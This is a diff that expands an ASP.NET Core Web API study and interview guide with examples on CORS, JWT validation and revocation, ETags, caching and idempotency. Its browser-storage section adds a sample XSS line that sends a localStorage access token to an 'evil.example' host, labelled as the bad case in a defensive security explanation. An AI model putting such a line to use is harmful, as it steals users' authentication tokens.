@@ -200,7 +200,9 @@ or
 Accept: application/xml
 ```
 
-The requested format must be supported by a registered output formatter. If no acceptable formatter is available, configure and test the API's behavior for unsupported `Accept` values.
+The requested format must be supported by a registered output formatter. By default, if the client asks for a format the API cannot produce (for example `Accept: application/pdf`), ASP.NET Core ignores the request and returns the default format (JSON) anyway. To return `406 Not Acceptable` instead, set `options.ReturnHttpNotAcceptable = true` in `AddControllers(options => ...)`. Whichever you choose, test it so clients get predictable behavior.
+
+Without `AddXmlSerializerFormatters()`, `Accept: application/xml` silently returns JSON; with it, the same request returns XML.
 
 ##### CSV or another custom format
 
@@ -264,7 +266,7 @@ Kestrel web server
         v
 ASP.NET Core middleware pipeline
         |
-        +--> Exception handling / logging / HTTPS / CORS (as configured)
+        +--> Exception handling / logging / HTTPS / CORS (browser cross-origin rules, see the CORS section) (as configured)
         |
         v
 Routing selects an endpoint
@@ -404,7 +406,9 @@ app.Run();
 
 #### 6. Authorization in Minimal APIs
 
-Add authentication and authorization services before building the app, then add middleware and protect endpoints.
+Add authentication and authorization services before building the app, then add middleware and protect endpoints. The example uses **JWT bearer** authentication: the client sends a JSON Web Token (a signed token carrying claims such as user id and department) in the `Authorization: Bearer <token>` header, and the API verifies the signature.
+
+Assumes `appsettings.json` contains `Authentication:Authority` (the identity provider's URL, used to download its signing keys) and `Authentication:Audience` (the API's own name, which the token must be issued for).
 
 ```csharp
 using Microsoft.AspNetCore.Authentication.JwtBearer;
@@ -444,6 +448,16 @@ Configure valid issuer/audience values and signing-key validation for the actual
 
 - **401 Unauthorized:** the request is not authenticated or its credentials are invalid.
 - **403 Forbidden:** the caller is authenticated but does not have permission.
+
+What each route returns:
+
+| Request | Result |
+|---|---|
+| `GET /public` (no token) | `200` |
+| `GET /private` (no token, or expired/forged token) | `401` |
+| `GET /private` (valid token) | `200` |
+| `GET /it-only` (valid token with `department: "Sales"`) | `403` (identity known, but the `department` claim is not `IT`) |
+| `GET /it-only` (valid token with `department: "IT"`) | `200` |
 
 #### 7. Swagger / OpenAPI in .NET 8 Minimal APIs
 
@@ -540,7 +554,7 @@ Attach the example to the endpoint using the package's supported request-example
 | Common payload | JSON | Protocol Buffers (binary by default) |
 | Transport | Commonly HTTP/1.1 or HTTP/2 | HTTP/2 |
 | Browser integration | Straightforward with `fetch` and standard HTTP tooling | Browser use typically needs gRPC-Web and supporting infrastructure |
-| Streaming | Possible, but requires suitable HTTP/API design | Unary, server streaming, client streaming and bidirectional streaming |
+| Streaming | Possible, but requires suitable HTTP/API design | Unary (one request, one response), server streaming, client streaming and bidirectional streaming built in |
 | Developer experience | Easy to inspect manually; broad tooling support | Generated clients/servers provide strongly typed contracts |
 | Common fit | Public APIs, web/mobile clients, broad interoperability | Efficient service-to-service communication, typed contracts, streaming |
 
@@ -559,6 +573,15 @@ gRPC is not always faster in every workload; performance depends on payloads, ne
 - `OPTIONS`: discover communication options; commonly used in CORS preflight.
 
 **Idempotent** means repeating the same request has the same intended effect as making it once. PUT or DELETE may return different status codes on later calls and still be idempotent.
+
+```http
+PUT /api/employees/1   {"name":"Ayesha"}   -> 200 (name is now Ayesha)
+PUT /api/employees/1   {"name":"Ayesha"}   -> 200 (same end state: idempotent)
+DELETE /api/employees/1                    -> 204 (deleted)
+DELETE /api/employees/1                    -> 404 (different status, same end state: still idempotent)
+POST /api/employees    {"name":"Ayesha"}   -> 201 (employee 7 created)
+POST /api/employees    {"name":"Ayesha"}   -> 201 (employee 8 created: NOT idempotent, a retry duplicates)
+```
 
 ##### Status codes
 
@@ -716,6 +739,18 @@ An **ETag** (entity tag) is an opaque validator identifying a particular version
 
 A client can send `If-Match: "product-42-v3"` with an update. The server updates only if the current version matches; otherwise it returns `412 Precondition Failed`. The check and database update must be atomic to avoid race conditions.
 
+Why it matters (the **lost update** problem):
+
+```text
+1. Alice GETs the product       -> ETag "v3"
+2. Bob GETs the product         -> ETag "v3"
+3. Bob PUTs with If-Match "v3"  -> 200, product is now "v4"
+4. Alice PUTs with If-Match "v3" -> 412 (current version is "v4")
+   Without If-Match, step 4 would silently overwrite Bob's change.
+```
+
+Alice must re-GET, merge, and retry.
+
 ##### ASP.NET Core example: conditional GET
 
 This simplified example uses a stable version value. In a real API, obtain the version from the resource/database and ensure it changes whenever the representation changes.
@@ -726,14 +761,17 @@ public IActionResult GetProduct(int id)
 {
     // Example only: retrieve the product and its current version.
     var product = new { Id = id, Name = "Keyboard" };
-    var etag = "\"product-42-v3\"";
+    var etag = "\"product-42-v3\"";   // ETag values include the double quotes
 
+    // IfNoneMatch holds the client's stored ETag(s); "*" means "any version".
     if (Request.Headers.IfNoneMatch.Any(value =>
         value == etag || value == "*"))
     {
+        // Client's copy is current: send headers only, no body.
         return StatusCode(StatusCodes.Status304NotModified);
     }
 
+    // Otherwise send the full body plus the ETag for the client to store.
     Response.Headers.ETag = etag;
     return Ok(product);
 }
@@ -743,7 +781,7 @@ For production use, parse conditional headers according to HTTP semantics (inclu
 
 **Strong vs weak ETag**
 - Strong: `"v3"` — indicates byte-for-byte equivalent representation.
-- Weak: `W/"v3"` — indicates semantic equivalence; it is not suitable for `If-Match` strong comparison.
+- Weak: `W/"v3"` — indicates semantic equivalence (same meaning, bytes may differ, such as the same data with different whitespace or compression); it is not suitable for `If-Match` strong comparison.
 
 #### 5. Cache-Control
 
@@ -769,6 +807,16 @@ Response.Headers.CacheControl = "private, max-age=60";
 
 Do not mark personalized or confidential API responses `public` without assessing cache risks.
 
+Why it hurts (bad vs good):
+
+```http
+# Bad: user-specific data marked public. A shared cache (CDN/proxy) may serve Alice's data to Bob.
+GET /api/me/balance   ->  Cache-Control: public, max-age=300   {"balance": 1200}
+
+# Good: never stored by any cache.
+GET /api/me/balance   ->  Cache-Control: no-store              {"balance": 1200}
+```
+
 #### 6. Security headers
 
 Security headers are primarily enforced by browsers. They are useful for browser-facing APIs and especially for web applications serving HTML.
@@ -776,9 +824,9 @@ Security headers are primarily enforced by browsers. They are useful for browser
 | Header | Purpose | Important note |
 |---|---|---|
 | `Strict-Transport-Security` (HSTS) | Tells browsers to use HTTPS for future requests | Send only over HTTPS; understand `includeSubDomains` before enabling it |
-| `X-Content-Type-Options: nosniff` | Stops MIME-type sniffing | Useful general hardening |
+| `X-Content-Type-Options: nosniff` | Stops MIME-type sniffing (the browser guessing a file's type from its content, so an uploaded "image" containing script could run as a script) | Useful general hardening |
 | `Content-Security-Policy` (CSP) | Restricts sources for scripts, styles, images, and other content | Most important for HTML; API-only JSON responses usually gain less from it |
-| `X-Frame-Options: DENY` | Prevents framing in browsers | Helps against clickjacking; CSP `frame-ancestors` is the modern alternative |
+| `X-Frame-Options: DENY` | Prevents framing in browsers | Helps against clickjacking (an attacker's page embeds your site in an invisible frame and tricks users into clicking it); CSP `frame-ancestors` is the modern alternative |
 | `Referrer-Policy` | Limits referrer information sent by browsers | e.g. `strict-origin-when-cross-origin` |
 | `Permissions-Policy` | Restricts browser features such as camera or microphone | Mainly relevant to web pages |
 | `Cross-Origin-Opener-Policy` (COOP) | Controls relationships between browsing contexts | Mainly web-application hardening |
@@ -830,7 +878,16 @@ In production, confirm HTTPS termination/proxy configuration and avoid blindly a
 
 #### 7. CORS
 
-**CORS is a browser-enforced policy**, not an authentication or authorization mechanism. Configure it with ASP.NET Core rather than manually writing CORS headers.
+**CORS (Cross-Origin Resource Sharing) is a browser-enforced policy**, not an authentication or authorization mechanism. An **origin** is scheme + host + port, so a page at `https://app.example.com` calling `https://api.example.com` is cross-origin. By default the browser blocks the page's JavaScript from reading such responses unless the API opts in. Configure it with ASP.NET Core rather than manually writing CORS headers.
+
+How a browser call to a different origin works:
+
+1. The page's JavaScript calls `fetch("https://api.example.com/items", { headers: { Authorization: "..." } })`.
+2. Because of the custom header, the browser first sends a **preflight** (a permission check): `OPTIONS /items` with `Origin: https://app.example.com` and `Access-Control-Request-Method: GET`.
+3. The API replies with `Access-Control-Allow-Origin: https://app.example.com` (plus allowed methods/headers). ASP.NET Core's CORS middleware does this.
+4. If the reply allows it, the browser sends the real request and lets the page read the response. If not, the browser blocks the page from seeing the response, with a CORS error in the console.
+
+CORS only limits what browser JavaScript may read. Non-browser clients (curl, Postman, other servers) ignore it, and "simple" requests (for example a plain `POST` form) reach the server even when the browser hides the response. That is why CORS is not security for the API.
 
 ```csharp
 builder.Services.AddCors(options =>
@@ -994,7 +1051,16 @@ For authentication cookies, prefer server-set cookies with `HttpOnly`, `Secure`,
 | Lifetime | Until cleared | Normally until tab session ends | Session or configured expiry |
 | Common use | Preferences | Temporary UI state | Authentication/session identifier |
 
-**Security rule:** Do not store secrets or sensitive authentication tokens in local storage or session storage: JavaScript running in the origin can read them, including malicious script injected through an XSS vulnerability.
+**Security rule:** Do not store secrets or sensitive authentication tokens in local storage or session storage: JavaScript running in the origin can read them, including malicious script injected through an XSS (cross-site scripting) vulnerability.
+
+```javascript
+// Bad: a comment field rendered unescaped lets an attacker inject this script into your page.
+// It runs with your origin's rights and can read the token and send it away.
+fetch("https://evil.example/steal?t=" + localStorage.getItem("access_token"));
+
+// Good: the token lives in an HttpOnly cookie set by the server,
+// so document.cookie and localStorage expose nothing to steal.
+```
 
 ---
 
@@ -1153,6 +1219,12 @@ Notice that at **Step 6** the API does not normally need to query the database t
 
 A signed JWT is normally validated using its signature and claims, including its expiry. In a purely stateless setup, the API does not keep a record of each access token. Consequently, deleting the token from the browser does **not** invalidate a copied token: that token can still work until it expires unless the API has a revocation mechanism.
 
+```text
+10:00  User logs in, gets JWT (exp 10:15). An attacker copies it.
+10:05  User clicks Logout; the browser deletes its copy.
+10:10  Attacker calls the API with the copied JWT -> signature and exp are valid -> 200 OK.
+```
+
 ##### Recommended pattern: short-lived access token + rotating refresh token
 
 1. Issue an access JWT with a short lifetime, for example 5–15 minutes, based on the application's risk profile.
@@ -1195,7 +1267,16 @@ builder.Services
     });
 ```
 
-`ClockSkew = TimeSpan.Zero` removes the default clock-skew allowance. In production, use a strong secret from a secure configuration source such as a secret manager; do not hard-code it or commit it to source control.
+What each setting protects against:
+
+| Setting | Rejects a token that... |
+|---|---|
+| `ValidateIssuer` | was issued by someone other than your trusted server |
+| `ValidateAudience` | was issued for a different API (a token for API A replayed against API B) |
+| `ValidateIssuerSigningKey` | was not signed with your key (forged or tampered) |
+| `ValidateLifetime` | has expired (`exp` claim is in the past) |
+
+`ClockSkew = TimeSpan.Zero` removes the default clock-skew allowance (by default a token is still accepted for 5 minutes after `exp`, to tolerate clocks that differ between servers). With zero, a token expiring at 10:00:00 is rejected at 10:00:01, but servers with drifting clocks may reject valid tokens. In production, use a strong secret from a secure configuration source such as a secret manager; do not hard-code it or commit it to source control.
 
 ##### Approaches for immediate access-token revocation
 
@@ -1205,6 +1286,11 @@ builder.Services
 - On each authenticated request, check whether its `jti` is revoked.
 - Reject revoked tokens.
 
+```text
+Logout:   store "jti=abc123" in Redis with TTL = token's remaining lifetime
+Request:  JWT {jti: "abc123"} -> Redis has abc123 -> 401
+```
+
 This enables prompt revocation but adds storage and a lookup to requests. Avoid using an unbounded in-memory `HashSet` in a multi-instance or production deployment. A token hash can also be used as a denylist key, but a unique identifier such as `jti` is usually easier to manage.
 
 **B. User-level security stamp or token version**
@@ -1212,6 +1298,11 @@ This enables prompt revocation but adds storage and a lookup to requests. Avoid 
 - Include the issued version in the token.
 - Compare it against current server-side state when validating requests.
 - Increment it to revoke all relevant tokens for that user.
+
+```text
+Token issued with claim {ver: 4}; user record has ver = 4  -> accepted
+"Sign out everywhere": user record ver becomes 5           -> every old token (ver 4) is rejected
+```
 
 This is useful for “sign out everywhere” or account-compromise scenarios, but it makes validation stateful and requires careful cache invalidation.
 
@@ -1222,7 +1313,13 @@ Changing a shared signing key invalidates every token signed with the old key, n
 
 - Generate refresh tokens with a cryptographically secure random generator.
 - Store only a hash of each refresh token when feasible.
-- Rotate tokens after successful use and detect reuse.
+- Rotate tokens after successful use and detect reuse. Example:
+
+  ```text
+  1. Client sends refresh token R1      -> server marks R1 used, returns access token + R2
+  2. Attacker (who stole R1) sends R1   -> server sees R1 was already used: treat as theft,
+                                           revoke R2 and the whole token family, force re-login
+  ```
 - Revoke tokens on logout, password reset, account disablement, or suspected compromise as required by policy.
 - Set expiry, and protect refresh tokens in transit and at rest.
 - If refresh tokens are in cookies, account for CSRF protection and use `HttpOnly`, `Secure`, and an appropriate `SameSite` setting.
@@ -1870,6 +1967,8 @@ The request flow (Kestrel → middleware → routing → auth → endpoint) is s
 
 #### Example controller
 
+Assumes `_service` is an injected `IOrderService` field (constructor not shown) and `OrderDto` is the response model.
+
 ``` csharp
 [ApiController]
 [Route("api/orders")]
@@ -1926,6 +2025,22 @@ public sealed class OrdersController : ControllerBase
 -   **Streaming responses** may start sending data before the entire
     body has been produced; exception handling is more limited after
     that point.
+
+**Why response start matters** (bad vs good):
+
+``` csharp
+// Bad: the header is set after the body may already have been sent.
+await next(context);
+context.Response.Headers["X-Trace"] = "abc";   // throws or is silently ignored once the response has started
+
+// Good: register the header to be written just before headers are sent.
+context.Response.OnStarting(() =>
+{
+    context.Response.Headers["X-Trace"] = "abc";
+    return Task.CompletedTask;
+});
+await next(context);
+```
 
 ------------------------------------------------------------------------
 
@@ -2132,7 +2247,10 @@ cloud gateway.
 #### 4.3 Test unauthenticated access
 
 Assume `/api/secure` requires authentication and the test host is
-configured to use the intended authentication scheme.
+configured to use the intended authentication scheme. In this and the
+following tests, `_factory` is a `WebApplicationFactory<Program>` field
+supplied by the test class constructor through `IClassFixture` (as
+`ApiFactory` was in 4.2); the 4.4 tests use `AuthApiFactory`.
 
 ``` csharp
 [Fact]
@@ -2232,6 +2350,8 @@ scheme is selected for the endpoints under test. Some applications
 require removing or replacing existing authentication registrations. Do
 not use this test handler in production.
 
+How the pieces connect: the test sends header `X-Test-Role: Admin`, the handler turns it into a role claim, and `[Authorize(Roles = "Admin")]` checks that claim. No token is involved.
+
 Example endpoint:
 
 ``` csharp
@@ -2240,7 +2360,7 @@ Example endpoint:
 public IActionResult AdminOnly() => Ok(new { message = "allowed" });
 ```
 
-Tests:
+Tests (assumes a test class with `IClassFixture<AuthApiFactory>` and a `_factory` field of that type):
 
 ``` csharp
 [Fact]
@@ -2477,72 +2597,119 @@ to test it.
 **Question:** The client did not receive a response, but the server may
 have created the order. How do you prevent duplicate orders?
 
-**Expected discussion:** - A timeout does not prove the server failed to
-process the request. - POST is not inherently idempotent. - Use an
-idempotency key or domain-level deduplication with durable storage and
-suitable uniqueness constraints. - Define the key's scope, retention,
-replay response, and concurrent-request behavior. - Integration-test
-repeated and concurrent submissions.
+**Expected discussion:**
+
+- A timeout does not prove the server failed to process the request.
+- POST is not inherently idempotent.
+- Use an idempotency key or domain-level deduplication with durable
+  storage and suitable uniqueness constraints.
+- Define the key's scope, retention, replay response, and
+  concurrent-request behavior.
+- Integration-test repeated and concurrent submissions.
+
+```http
+POST /api/orders
+Idempotency-Key: 7f2d-order-attempt-1     (client generates one key per logical order)
+
+-> first call:  201 Created, order 55 (server stores key -> order 55)
+-> retry:       same key found, server returns the stored 201/order 55; no second order
+```
 
 #### Scenario 2: An API returns 200 for every error
 
 **Question:** Why is this a contract problem?
 
-**Expected discussion:** - HTTP clients, gateways, monitoring, caching,
-and retry policies rely on status semantics. - Use meaningful status
-codes and a stable ProblemDetails error format. - Keep machine-readable
-error codes separate from human-readable detail. - Avoid changing
-established contracts without versioning or a migration plan.
+**Expected discussion:**
+
+- HTTP clients, gateways, monitoring, caching, and retry policies rely
+  on status semantics. For example, a dashboard counting 5xx responses
+  will show zero errors, and a retry policy will never retry.
+- Use meaningful status codes and a stable ProblemDetails error format
+  (a standard JSON error body with `type`, `title`, `status`, `detail`).
+- Keep machine-readable error codes separate from human-readable detail.
+- Avoid changing established contracts without versioning or a
+  migration plan.
 
 #### Scenario 3: A user has a valid token but can access another tenant's data
 
 **Question:** Authentication works. What is missing?
 
-**Expected discussion:** - Authentication does not grant access to every
-resource. - Enforce tenant and object-level authorization at trusted
-server-side boundaries. - Do not trust a tenant ID supplied only by the
-request body or query string. - Test cross-tenant access with negative
-integration tests. - Audit logs should help investigations without
-recording sensitive tokens or unnecessary personal data.
+**Expected discussion:**
+
+- Authentication does not grant access to every resource.
+- Enforce tenant and object-level authorization at trusted server-side
+  boundaries.
+- Do not trust a tenant ID supplied only by the request body or query
+  string.
+- Test cross-tenant access with negative integration tests.
+- Audit logs should help investigations without recording sensitive
+  tokens or unnecessary personal data.
+
+``` csharp
+// Bad: any logged-in user can read any order by guessing ids (an IDOR flaw).
+var order = await db.Orders.FindAsync(id);
+
+// Good: the tenant comes from the validated token's claim, not from the request.
+var tenantId = User.FindFirstValue("tenant_id");
+var order = await db.Orders.SingleOrDefaultAsync(o => o.Id == id && o.TenantId == tenantId);
+// Not found (or other tenant's) -> return 404 (or 403).
+```
 
 #### Scenario 4: A response header disappears on exceptions
 
 **Question:** How would you diagnose it?
 
-**Expected discussion:** - Review middleware order and exception
-handling. - Check whether the header is set before or after
-`await next`. - Consider `Response.OnStarting` and whether the response
-has already started. - Reproduce with an integration test that forces an
-endpoint exception. - Ensure the error handler does not accidentally
-overwrite the header.
+**Expected discussion:**
+
+- Review middleware order and exception handling. If the exception
+  handler clears the response and re-runs, headers set earlier can be
+  wiped.
+- Check whether the header is set before or after `await next`.
+- Consider `Response.OnStarting` and whether the response has already
+  started.
+- Reproduce with an integration test that forces an endpoint exception.
+- Ensure the error handler does not accidentally overwrite the header.
 
 #### Scenario 5: An endpoint is slow despite fast database queries
 
 **Question:** What would you investigate?
 
-**Expected discussion:** - End-to-end distributed traces and dependency
-timings. - Serialization cost and payload size. - Downstream HTTP calls,
-connection pooling, thread-pool starvation, locks, and queueing. -
-Pagination, compression, caching, and asynchronous I/O. - Compare
-latency percentiles, not just average duration.
+**Expected discussion:**
+
+- End-to-end distributed traces and dependency timings.
+- Serialization cost and payload size.
+- Downstream HTTP calls, connection pooling, thread-pool starvation
+  (all worker threads blocked, e.g. by `.Result` on async calls, so new
+  requests queue), locks, and queueing.
+- Pagination, compression, caching, and asynchronous I/O.
+- Compare latency percentiles (p95/p99: the time 95% or 99% of requests
+  beat), not just average duration, because a few very slow requests
+  hide in the average.
 
 #### Scenario 6: Should validation failures be 400 or 422?
 
-**Expected discussion:** - 400 is commonly used for malformed requests
-and is also the default for automatic `[ApiController]` model-validation
-failures. - 422 can distinguish syntactically valid content that fails
-semantic validation. - Both conventions can work if documented and
-consistently implemented. - Consider client compatibility and the
-existing API contract before changing behavior.
+**Expected discussion:**
+
+- 400 is commonly used for malformed requests (for example, broken
+  JSON) and is also the default for automatic `[ApiController]`
+  model-validation failures.
+- 422 can distinguish syntactically valid content that fails semantic
+  validation (for example, well-formed JSON with `"age": -5`).
+- Both conventions can work if documented and consistently implemented.
+- Consider client compatibility and the existing API contract before
+  changing behavior.
 
 #### Scenario 7: How do you test authorization without real tokens?
 
-**Expected discussion:** - Use a test-only authentication scheme with
-controlled claims and roles to exercise authorization policies. -
-Separately test production JWT validation for signature, issuer,
-audience, and lifetime. - Never allow the fake handler into production
-configuration. - Test missing credentials, insufficient permission, and
-allowed access.
+**Expected discussion:**
+
+- Use a test-only authentication scheme with controlled claims and
+  roles to exercise authorization policies (see 4.4 above).
+- Separately test production JWT validation for signature, issuer,
+  audience, and lifetime.
+- Never allow the fake handler into production configuration.
+- Test missing credentials, insufficient permission, and allowed
+  access.
 
 ------------------------------------------------------------------------
 
@@ -2623,6 +2790,15 @@ allowed access.
 ###### 19. What is service lifetime? Compare `AddTransient`, `AddSingleton`, and `AddScoped` (PDF p. 9)
 **Answer:** Transient creates a new instance each resolution; scoped creates one instance per scope (normally per web request); singleton creates one instance for the application's lifetime. Singleton services must be thread-safe and must not capture shorter-lived scoped services directly.
 
+```csharp
+// Bad (captive dependency): the singleton keeps the first request's DbContext forever.
+services.AddScoped<AppDbContext>();
+services.AddSingleton<ReportCache>();   // constructor takes AppDbContext
+
+// Good: make ReportCache scoped, or have it take IServiceScopeFactory and create a scope per use.
+services.AddScoped<ReportCache>();
+```
+
 ###### 20. What is routing and what are its types? (PDF p. 9)
 **Answer:** Routing maps an incoming URL and HTTP method to an endpoint. ASP.NET Core supports attribute routing (templates on controllers/actions) and conventional routing (route patterns configured centrally); endpoint routing underlies both.
 
@@ -2651,7 +2827,7 @@ allowed access.
 **Answer:** Cross-Origin Resource Sharing is a browser-enforced mechanism in which a server declares which origins, methods, and headers may access its responses. Configure a narrow allowlist and required credentials/headers; CORS is not authentication and does not restrict non-browser clients.
 
 ###### 29. Why does CORS cause no issue in Postman but does in a browser? (PDF p. 9)
-**Answer:** Browsers enforce the same-origin policy and CORS response rules; Postman is not a browser and does not enforce them. Configure the API to allow the intended frontend origin and handle preflight `OPTIONS` requests; never treat CORS as access control.
+**Answer:** Browsers enforce the same-origin policy and CORS response rules; Postman is not a browser and does not enforce them. Configure the API to allow the intended frontend origin and handle preflight `OPTIONS` requests (the browser's permission check before the real call; see the CORS section above); never treat CORS as access control. Example: the same `GET https://api.example.com/items` works in Postman, but a page on `https://app.example.com` sees "blocked by CORS policy" until the API sends `Access-Control-Allow-Origin: https://app.example.com`.
 
 ###### 30. What is a RESTful API? (PDF p. 10)
 **Answer:** A REST-style API models resources and uses HTTP semantics and representations, commonly with stateless requests, resource URLs, and methods such as GET, POST, PUT, PATCH, and DELETE. A REST API should respect HTTP status, caching, and idempotency semantics.
@@ -2667,6 +2843,11 @@ allowed access.
 
 ###### 34. POST vs. PUT (do not use records; idempotent) (PDF p. 10)
 **Answer:** POST commonly submits data for server-defined processing or creates a subordinate resource; repeating it may create multiple effects. PUT replaces or creates the resource at a known URI and is intended to be idempotent. A record/value being immutable does not define the HTTP method's semantics.
+
+```http
+POST /api/orders {"item":"pen"}    -> 201 /api/orders/7, again -> 201 /api/orders/8 (server picks the URI; duplicates)
+PUT  /api/orders/7 {"item":"pen"}  -> 200, again -> 200 (client names the URI; same end state)
+```
 
 ###### 35. If we can modify a resource via POST, why do we need PUT? (PDF p. 10)
 **Answer:** HTTP methods communicate semantics to clients, caches, and intermediaries. POST is flexible processing and is not generally idempotent; PUT expresses replacement at a known URI and is idempotent, enabling clients to retry safely when implemented correctly.
@@ -2695,17 +2876,33 @@ allowed access.
 ###### 43. How do you implement sorting and paging in .NET Core? (PDF p. 10)
 **Answer:** Accept validated sort keys/direction and page size/continuation parameters, apply them to an ordered database query before materialization, and cap page sizes. Prefer keyset/continuation paging for large, changing datasets; return metadata or a continuation token as part of the API contract.
 
+```csharp
+// Offset paging: simple, but slow on deep pages and can skip/repeat rows when data changes.
+db.Products.OrderBy(p => p.Id).Skip((page - 1) * size).Take(size);
+
+// Keyset paging: "give me the next 20 after the last id I saw" (fast, stable).
+db.Products.Where(p => p.Id > lastSeenId).OrderBy(p => p.Id).Take(size);
+```
+
 ###### 44. How do you implement authentication/authorization in .NET Core? (PDF p. 10)
 **Answer:** Configure an authentication scheme (for example, OpenID Connect/JWT bearer), call `UseAuthentication()` before `UseAuthorization()`, and protect endpoints with policies/roles/claims. Authentication identifies the caller; authorization decides what that caller may do.
 
 ###### 45. What is JWT? State its parts and implementation (PDF p. 10)
 **Answer:** A JSON Web Token commonly has three Base64URL-encoded parts: header, payload/claims, and signature (JWS). Validate signature, issuer, audience, and expiry on the API using trusted keys; avoid sensitive secrets in claims because the payload is encoded, not encrypted.
 
+```text
+eyJhbGciOi...  .  eyJzdWIiOiI0MiIsImV4cCI6MTc...  .  SflKxwRJSM...
+   header            payload (claims)                  signature
+{"alg":"HS256"}   {"sub":"42","role":"Admin","exp":1767225600}   (HMAC of header.payload with the secret key)
+```
+
+Anyone can Base64-decode the first two parts; only the signature check proves the token was not altered.
+
 ###### 46. JWT logout (PDF p. 10)
 **Answer:** A self-contained access token remains valid until expiry unless the server adds revocation. Use short-lived access tokens with refresh-token revocation/rotation, or a denylist/session version when immediate revocation is required; clear client-held credentials and use secure storage.
 
 ###### 47. When should OpenID Connect/OAuth be used instead of custom JWT? (PDF p. 10)
-**Answer:** Use OpenID Connect for standardized user authentication and OAuth 2.0 for delegated authorization/API access, typically through a trusted identity provider. Custom token issuance is rarely justified because key management, validation, rotation, and protocol security are easy to get wrong.
+**Answer:** Use OpenID Connect (OIDC, a login layer built on OAuth 2.0 that proves who the user is) for standardized user authentication and OAuth 2.0 (a framework for letting an app obtain limited access tokens to an API) for delegated authorization/API access, typically through a trusted identity provider. Custom token issuance is rarely justified because key management, validation, rotation, and protocol security are easy to get wrong.
 
 ###### 48. How do you save sensitive data in a database? (PDF p. 10)
 **Answer:** Minimize and classify data, restrict access, use parameterized queries, encrypt transport and storage, and manage keys separately through a vault/KMS with rotation and auditing. Hash passwords with a dedicated slow password-hashing algorithm and unique salts; encryption is not a substitute for authorization.
